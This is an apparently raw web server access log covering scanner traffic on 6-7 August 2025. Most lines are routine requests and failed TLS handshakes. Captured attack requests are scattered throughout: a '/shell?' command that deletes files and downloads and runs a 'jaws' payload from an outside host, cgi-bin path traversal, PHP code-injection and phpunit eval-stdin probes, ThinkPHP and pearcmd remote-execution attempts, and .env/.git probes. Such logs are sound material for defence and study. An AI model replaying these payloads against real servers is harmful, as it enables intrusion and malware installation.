+198.235.24.96 - - [06/Aug/2025 23:21:47] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03£')
+198.235.24.96 - - [06/Aug/2025 23:21:47] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03£[0m" 400 -
+198.235.24.96 - - [06/Aug/2025 23:21:48] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.96 - - [06/Aug/2025 23:21:48] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03ÿÏ\x07\x88àL\x16PKÓ¢\x92% ÷\x80RB²Pew}ô=i\x9b\x1c~½½5\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+79.124.58.198 - - [06/Aug/2025 23:25:20] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+196.251.86.50 - - [06/Aug/2025 23:38:16] "GET / HTTP/1.0" 200 -
+20.65.194.168 - - [06/Aug/2025 23:49:48] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+143.110.255.53 - - [07/Aug/2025 00:06:45] "[33mGET /.env HTTP/1.1[0m" 404 -
+143.110.255.53 - - [07/Aug/2025 00:06:46] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+81.17.23.242 - - [07/Aug/2025 00:07:29] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [07/Aug/2025 00:07:34] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [07/Aug/2025 00:30:04] code 400, message Bad request version ('À\x13À')
+79.124.58.198 - - [07/Aug/2025 00:30:04] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03'±\x7f]÷ànTÚ²F\x12©\x17>Ü>®Xj\x94\x99\x17yAÛ\x95üý\x09X\x9a Þ²\x1eªú\x06¹Nyú\x8e\x86\x05tÖ\x09í1æ\x18\x1c1"_m\x06Ô0ð[&M\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+204.76.203.219 - - [07/Aug/2025 00:31:16] "GET / HTTP/1.1" 200 -
+194.50.16.252 - - [07/Aug/2025 01:16:08] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+156.223.22.163 - - [07/Aug/2025 01:24:41] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+156.223.22.163 - - [07/Aug/2025 01:24:41] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+103.20.102.84 - - [07/Aug/2025 01:26:08] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+194.165.16.162 - - [07/Aug/2025 01:35:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+194.165.16.162 - - [07/Aug/2025 01:35:40] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+91.224.92.17 - - [07/Aug/2025 02:00:07] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [07/Aug/2025 02:43:14] "GET / HTTP/1.1" 200 -
+81.17.23.242 - - [07/Aug/2025 03:02:24] "GET / HTTP/1.1" 200 -
+64.62.156.192 - - [07/Aug/2025 03:07:09] "GET / HTTP/1.1" 200 -
+64.62.156.201 - - [07/Aug/2025 03:09:34] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+64.62.156.192 - - [07/Aug/2025 03:10:22] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+68.69.186.238 - - [07/Aug/2025 04:12:27] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [07/Aug/2025 04:32:23] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [07/Aug/2025 05:02:40] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+64.62.197.77 - - [07/Aug/2025 05:32:50] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ä4ô£[¿ÄáÒòuºö\\t&\x0e\x95\x9dÄàk¥W\x86ðßé¤¬fZ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+64.62.197.77 - - [07/Aug/2025 05:32:50] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ä4ô£[¿ÄáÒòuºö\\t&\x0e\x95\x9dÄàk¥W\x86ðßé¤¬fZ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+71.6.199.87 - - [07/Aug/2025 05:34:10] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [07/Aug/2025 05:53:45] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [07/Aug/2025 05:53:45] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+141.98.11.57 - - [07/Aug/2025 06:15:03] code 400, message Bad request version ('}')
+141.98.11.57 - - [07/Aug/2025 06:15:03] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+199.204.96.10 - - [07/Aug/2025 06:29:37] "[33mCONNECT www.google.com:443 HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:07] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:07] "[33mPOST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:08] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:08] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:09] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:09] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:10] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:10] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:11] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:11] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:12] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:12] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:13] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:13] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:14] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:14] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:15] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:15] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:16] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:16] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:17] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:17] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:18] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:18] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:19] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:19] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:20] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:20] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:20] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:21] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:21] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:22] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:22] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:23] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:23] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:24] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:24] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:25] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:25] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:26] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:26] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:27] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:27] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:28] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1[0m" 404 -
+146.88.68.94 - - [07/Aug/2025 06:50:28] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+81.17.23.242 - - [07/Aug/2025 06:59:27] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [07/Aug/2025 07:12:36] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [07/Aug/2025 07:12:36] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03=Ï\x81«\x98\x12ê¨#8½ÔNqOúW}\x0dÄë\x16â"fék"Î>A\x04\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+66.23.227.22 - - [07/Aug/2025 07:41:11] "GET / HTTP/1.0" 200 -
+185.189.182.234 - - [07/Aug/2025 07:44:41] "GET / HTTP/1.1" 200 -
+162.142.125.201 - - [07/Aug/2025 07:47:41] "GET / HTTP/1.1" 200 -
+162.142.125.201 - - [07/Aug/2025 07:47:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+162.142.125.201 - - [07/Aug/2025 07:47:52] code 505, message Invalid HTTP version (2.0)
+162.142.125.201 - - [07/Aug/2025 07:47:52] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+162.142.125.201 - - [07/Aug/2025 07:48:14] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+162.142.125.201 - - [07/Aug/2025 07:48:18] code 505, message Invalid HTTP version (2.0)
+162.142.125.201 - - [07/Aug/2025 07:48:18] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+162.142.125.201 - - [07/Aug/2025 07:48:33] code 400, message Bad request version ('À\x14À')
+162.142.125.201 - - [07/Aug/2025 07:48:33] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x12é\x9eLMAx5(Â/\x95Ç]\x97¥\x9f°\x87\x7f\x98½Óá\x0bêoå]\x1e\x17à î\x1cú%Ï\x14Ø\x11I%V+\x8f»ýáð\x06\x08½>¶¦\x95ÈËÏÀ¥Vøe\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+162.142.125.201 - - [07/Aug/2025 07:48:36] "[33mGET /wiki HTTP/1.1[0m" 404 -
+34.22.197.110 - - [07/Aug/2025 08:11:08] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [07/Aug/2025 08:19:41] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+172.202.117.220 - - [07/Aug/2025 08:28:30] "[33mGET /developmentserver/metadatauploader HTTP/1.1[0m" 404 -
+91.224.92.17 - - [07/Aug/2025 08:54:40] "GET / HTTP/1.1" 200 -
+162.216.149.19 - - [07/Aug/2025 09:35:53] "GET / HTTP/1.1" 200 -
+134.209.86.21 - - [07/Aug/2025 09:37:43] "GET / HTTP/1.1" 200 -
+134.209.86.21 - - [07/Aug/2025 09:37:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+77.83.240.4 - - [07/Aug/2025 09:57:46] "GET / HTTP/1.0" 200 -
